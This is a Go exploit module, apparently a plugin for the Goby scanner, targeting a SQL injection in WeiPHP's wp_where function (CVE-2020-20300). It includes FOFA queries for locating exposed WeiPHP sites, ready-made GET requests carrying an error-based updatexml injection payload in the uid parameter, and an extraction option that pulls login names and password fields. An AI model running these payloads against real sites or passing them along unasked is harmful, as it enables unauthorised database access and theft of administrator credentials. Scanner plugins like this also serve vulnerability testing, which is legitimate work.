package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weiphp wp_where SQL injection (CVE-2020-20300)",
    "Description": "SQL injection vulnerability in the wp_where function in WeiPHP 5.0",
    "Impact": "Weiphp wp_where SQL injection (CVE-2020-20300)",
    "Recommendation": "<p>Upgrade product version,install patch.</p>",
    "Product": "WeiPHP",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Weiphp 内容管理系统 wp_where 文件 SQL注入漏洞 (CVE-2020-20300)",
            "Description": "<p>Weiphp CMS是一个一站式SaaS应用服务平台。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.weiphp.cn/doc.html\">https://www.weiphp.cn/doc.html</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "WeiPHP",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Weiphp wp_where SQL injection (CVE-2020-20300)",
            "Description": "SQL injection vulnerability in the wp_where function in WeiPHP 5.0",
            "Impact": "Weiphp wp_where SQL injection (CVE-2020-20300)",
            "Recommendation": "<p>Upgrade product version,install patch.<br></p>",
            "Product": "WeiPHP",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"content=\\\"WeiPHP\" || body=\"/css/weiphp.css\" || title=\"weiphp\" || title=\"weiphp4.0\")",
    "GobyQuery": "(body=\"content=\\\"WeiPHP\" || body=\"/css/weiphp.css\" || title=\"weiphp\" || title=\"weiphp4.0\")",
    "Author": "isbasein@gmail.com",
    "Homepage": "https://www.weiphp.cn/",
    "DisclosureDate": "2021-05-28",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-20300"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2020-20300"
    ],
    "CNVD": [
        "CNVD-2020-73164"
    ],
    "CNNVD": [
        "CNNVD-202012-1360"
    ],
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c4ca4238a0b923820dcc509a6f75849",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c4ca4238a0b923820dcc509a6f75849",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c4ca4238a0b923820dcc509a6f75849",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c4ca4238a0b923820dcc509a6f75849",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlcolumns",
            "type": "select",
            "value": "login_name,SUBSTR(password%20FROM%201%20FOR%2016),SUBSTR(password%20FROM%2017%20FOR%2032)",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
